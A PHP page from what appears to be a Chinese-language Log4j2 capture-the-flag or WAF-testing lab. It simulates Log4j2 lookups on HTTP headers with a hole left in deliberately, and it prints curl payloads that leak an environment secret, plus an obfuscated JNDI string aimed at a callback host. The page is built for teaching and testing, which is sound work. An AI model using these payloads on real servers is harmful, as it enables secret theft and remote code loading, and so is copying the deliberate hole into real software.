<?php
/**
 * Log4j2 L2 — HTTP Header 注入（PHP 模拟 Log4j2 lookup 引擎）
 *
 * 漏洞原理: Log4j2 常被配置为记录 HTTP 请求头（如 User-Agent, X-Forwarded-For）。
 * 攻击者将 ${env:SECRET} 放在请求头中，Log4j2 解析后泄露环境变量。
 *
 * 目标: 环境变量 AWS_SECRET_ACCESS_KEY = flag{aws_internal_key_9f1a}
 * 攻击: curl -H 'User-Agent: ${env:AWS_SECRET_ACCESS_KEY}' /log4j/level2.php
 */

require_once '../config.php'; // 复用 log4j_resolve 不方便，直接在这里定义

// ---- Log4j2 Lookup 引擎模拟 ----
function log4j2_resolve($input) {
    $maxDepth = 5;
    $changed = true;
    $result = $input;
    while ($changed && $maxDepth-- > 0) {
        $changed = false;
        $result = preg_replace_callback(
            '/\$\{([^}]+)\}/',
            function ($m) use (&$changed) {
                $expr = $m[1];
                if (preg_match('/^env:(.+)$/i', $expr, $envM)) {
                    $val = getenv($envM[1]);
                    if ($val !== false) { $changed = true; return $val; }
                    return $m[0];
                }
                if (preg_match('/^sys:(.+)$/i', $expr, $sysM)) {
                    $changed = true;
                    $props = ['user.dir'=>'/opt/tomcat','java.home'=>'/usr/lib/jvm/java-8-openjdk'];
                    return $props[$sysM[1]] ?? $m[0];
                }
                if (preg_match('/^java:(.+)$/i', $expr, $jM)) {
                    $changed = true;
                    $javaProps = ['version'=>'1.8.0_301','runtime'=>'OpenJDK Runtime Environment'];
                    return $javaProps[$jM[1]] ?? $m[0];
                }
                if (preg_match('/^lower:(.+)$/i', $expr, $lM)) { $changed = true; return strtolower($lM[1]); }
                if (preg_match('/^upper:(.+)$/i', $expr, $uM)) { $changed = true; return strtoupper($uM[1]); }
                if (preg_match('/^::-(.+)$/', $expr, $dM)) { $changed = true; return $dM[1]; }
                if (preg_match('/^jndi:(.+)$/i', $expr, $jndiM)) { $changed = true; return "[JNDI:" . $jndiM[1] . "]"; }
                return $m[0];
            },
            $result
        );
    }
    return $result;
}

// ---- L2: HTTP Header 注入 ----
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$xForwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';

// ⚠️ 漏洞点: 请求头直接传入 Log4j2 解析引擎
$resolvedUA = log4j2_resolve($userAgent);
$resolvedXF = log4j2_resolve($xForwarded);

$cmdOutput = "LOG [INFO] IncomingRequest — "
    . "UserAgent(input): $userAgent | UserAgent(resolved): $resolvedUA | "
    . "X-Forwarded-For: $xForwarded";
?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>Log4j2 L2 - Header 注入</title>
    <style>
        body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
        h2 { color: #e94560; }
        .info { background: #16213e; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #e94560; }
        .code { background: #0f3460; padding: 10px; border-radius: 3px; color: #53d769; margin: 10px 0; font-size: 0.9em; }
        pre { background: #0f3460; padding: 15px; border-radius: 3px; color: #53d769; overflow-x: auto; white-space: pre-wrap; }
        table { border-collapse: collapse; width: 100%; margin: 15px 0; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; font-size: 0.9em; }
        th { background: #16213e; color: #ffd700; }
    </style>
</head>
<body>
    <h2>🪵 Log4j2 L2 — HTTP Header 注入</h2>
    <div class="info">
        <strong>说明:</strong> 模拟 Log4j2 记录 HTTP 请求头的场景。<br>
        攻击者将 payload 放在 <code>User-Agent</code> 或 <code>X-Forwarded-For</code> 头中。<br>
        <strong>目标:</strong> 通过 User-Agent 头注入 <code>${env:AWS_SECRET_ACCESS_KEY}</code> 泄露 AWS 内部密钥<br>
        <strong>成功标志:</strong> 日志输出中出现 <code>flag{...}</code><br>
        <strong>WAF难点:</strong> WAF 需要检查所有请求头，而不仅仅是 URL 参数
    </div>

    <div class="code">
        <strong>🔍 测试命令:</strong><br>
        <code>curl -H 'User-Agent: ${env:AWS_SECRET_ACCESS_KEY}' http://localhost:8090/log4j/level2.php</code><br>
        <code>curl -H 'X-Forwarded-For: ${java:version}' http://localhost:8090/log4j/level2.php</code><br>
        <code>curl -H 'User-Agent: ${${lower:j}ndi:ldap://callback/flag}' http://localhost:8090/log4j/level2.php</code>
    </div>

    <?php include '../success-banner.php'; ?>
    <h3>📋 日志输出:</h3>
    <table>
        <tr><th>字段</th><th>原始输入</th><th>Log4j2 解析后</th></tr>
        <tr><td>User-Agent</td><td><?= htmlspecialchars($userAgent) ?></td><td style="color:#53d769;"><?= htmlspecialchars($resolvedUA) ?></td></tr>
        <tr><td>X-Forwarded-For</td><td><?= htmlspecialchars($xForwarded) ?></td><td style="color:#53d769;"><?= htmlspecialchars($resolvedXF) ?></td></tr>
    </table>

    <p><a href="../index.php" style="color:#53d769;">← 返回主页</a></p>
<?php include '../waf-status.php'; ?>
</body>
</html>
